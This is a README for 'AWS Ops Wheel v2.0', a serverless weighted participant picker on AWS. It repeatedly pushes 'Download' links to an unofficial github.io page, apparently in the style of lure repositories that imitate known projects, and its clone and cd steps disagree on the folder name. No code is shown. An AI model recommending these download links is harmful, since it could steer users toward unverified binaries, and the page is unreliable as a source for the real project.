# AWS Ops Wheel v2.0 - randomizer 2026

> **AWS Ops Wheel is a serverless AWS participant picker that combines weighted selection, separated wheel groups for multiple tenants, and version 2.0 controls for determining the next result.**

[![Platform](https://img.shields.io/badge/Platform-AWS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bennettchrisov5273/aws-ops-wheel-randomizer?style=flat-square)](https://github.com/bennettchrisov5273/aws-ops-wheel-randomizer)

---

<p align="center">
  <a href="https://bennettchrisov5273.github.io/aws-ops-wheel-randomizer/">
    <img src="https://img.shields.io/badge/Download-AWS%20Ops%20Wheel%20Latest-brightgreen?style=for-the-badge" alt="Download AWS Ops Wheel">
  </a>
</p>

> **[Download AWS Ops Wheel v2.0](https://bennettchrisov5273.github.io/aws-ops-wheel-randomizer/)**

---

[Download Latest Build](https://bennettchrisov5273.github.io/aws-ops-wheel-randomizer/)

---

## Overview

AWS Ops Wheel provides a wheel-style randomizer for participant selection, running as a serverless application on AWS. It is intended for teams that need weighted choices, separated groups, and administrative control over access and selection outcomes.

The deployment supports multi-tenant operating models: individual wheel groups can keep their data isolated while administrators manage the broader installation. Cognito, DynamoDB, Lambda, and API Gateway work together to provide authentication, role-aware access, spin operations, and group configuration.

---

## Capabilities

- Give greater selection preference to participants who have not been picked recently through weighted randomization
- Define the result that should be selected next when advance control is required
- Maintain separate data handling for multiple tenant wheel groups
- Assign roles so users receive different management permissions
- Select several participants in a single spin
- Change participant weights or return them to their reset state
- Run the application with AWS serverless services including Cognito, DynamoDB, Lambda, and API Gateway
- Let administrators supervise deployment activity across wheel groups

---

## Getting Started

Retrieve the repository and deploy the included serverless application within your AWS environment.

1. Download the source:
   git clone https://github.com/bennettchrisov5273/aws-ops-wheel-randomizer.git
2. Change into the project directory:
   cd aws-ops-wheel
3. Deploy or host the application with your AWS configuration and provisioned service resources.
4. Once deployment is complete, open the application and log in using the required role.

---

## Using the Wheel

Begin by creating a wheel group and adding its participants. You can then run a weighted spin according to the group configuration.

A normal operating sequence is:

1. Create or select a wheel group and add participants.
2. Set participant weights or modify existing values as needed.
3. Run either a regular spin or a multi-select spin.
4. Reset weights to bring participants back to the default distribution.
5. When necessary, configure the next result before starting the spin.

Users with administrative permissions can control access, inspect behavior at the group level, and coordinate oversight across groups in the serverless deployment.

---

## Deployment Configuration

AWS resources and application settings associated with the deployment handle most configuration tasks.

The primary service mappings are:

- Cognito: authentication, users, and roles
- DynamoDB: wheel group and participant records
- Lambda: application processing and logic
- API Gateway: routing application requests

A deployment-oriented configuration can look like this:

    {
      "tenantMode": "multi-tenant",
      "selectionMode": "weighted",
      "dataStore": "dynamodb",
      "authProvider": "cognito"
    }

---

## System Requirements

- An AWS account with access to the cloud services required by the deployment
- Cognito, DynamoDB, Lambda, and API Gateway enabled and available
- A web browser for accessing the interface
- Network connectivity to the AWS endpoints hosting the application
- Sufficient storage and service quotas for the expected participant and wheel-group data

---

## Frequently Asked Questions

**What is the update process?**  
Deploy the newest source version again, then refresh the AWS resources used by the application.

**Can separate teams use their own wheel groups?**  
Yes. Multi-tenant wheel groups provide isolated data handling for different teams or workflows.

**Where does participant and weight information live?**  
The AWS-backed data layer manages this information, with DynamoDB serving as the primary data store.

**How can I alter the selection pattern?**  
Adjust participant weights, reset those weights, or use the next-result setting when a particular upcoming outcome is required.

**Which users can oversee settings for the whole deployment?**  
Deployment-wide, cross-group supervision is intended for administrators who have the corresponding role.

---

## License

This project is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the complete terms.
